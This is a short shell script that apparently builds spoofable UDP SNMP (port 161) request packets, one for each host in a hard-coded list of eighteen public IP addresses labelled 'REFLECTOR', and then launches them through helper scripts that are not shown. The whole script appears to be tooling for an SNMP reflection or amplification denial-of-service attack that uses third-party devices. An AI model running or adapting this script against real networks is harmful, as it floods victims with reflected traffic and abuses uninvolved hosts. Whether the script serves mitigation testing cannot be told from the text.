
SRCIP="X"
REFLECTOR="222.74.196.5 184.69.154.13 68.225.178.72 76.62.139.109 87.237.139.96 222.68.98.88 211.58.95.134 184.176.194.163 97.84.175.4 116.222.2.7 41.0.12.210 99.248.162.8 94.140.66.57 14.80.191.151 119.215.126.81 76.171.110.230 66.109.44.9 178.21.205.46"
DSTPORT="c16(161)"

TYPE=udp-snmp-nmapget
. ./lib.sh

REFLECTOR=$(echo $REFLECTOR| sed 's/\./,/g')

rm ${TYPE}.o
for all in $REFLECTOR; do
	cpp \
		-DDSTMAC="$RMAC" \
		-DSRCMAC="$MYMAC" \
		-DSRCIP="$SRCIP" \
		-DDSTIP="$all" \
		-DDSTPORT="$DSTPORT" \
	${TYPE}.cfg -o - >> ${TYPE}.o
	if [ $? != 0 ]; then
		echo "ERROR: cpp failed"
		exit 1
	fi
done

. ./run.sh
